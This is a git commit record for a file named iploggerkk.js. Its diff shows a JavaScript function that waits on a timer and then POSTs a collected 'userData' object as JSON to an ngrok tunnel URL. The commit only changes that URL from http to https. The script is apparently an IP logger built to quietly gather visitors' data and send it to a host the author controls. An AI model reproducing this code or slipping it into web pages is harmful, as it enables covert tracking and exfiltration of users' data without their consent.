dc40fdde85792530eb0dc70ecc4b4fcd6aa8bf2c
demon-i386 <75624951+demon-i386@users.noreply.github.com>
2021-06-18 19:04:42 -0300

    Create iploggerkk.js

--- iploggerkk.js
+++ iploggerkk.js
@@ -5,7 +5,7 @@ var userData = {
 var sendInfo = function(){
     setTimeout(function(){
         var xhr = new XMLHttpRequest();
-        xhr.open("POST", "http://dfe671c44d2b.ngrok.io", true);
+        xhr.open("POST", "https://dfe671c44d2b.ngrok.io", true);
         xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
         // send the collected data as JSON
         xhr.send(JSON.stringify(userData));
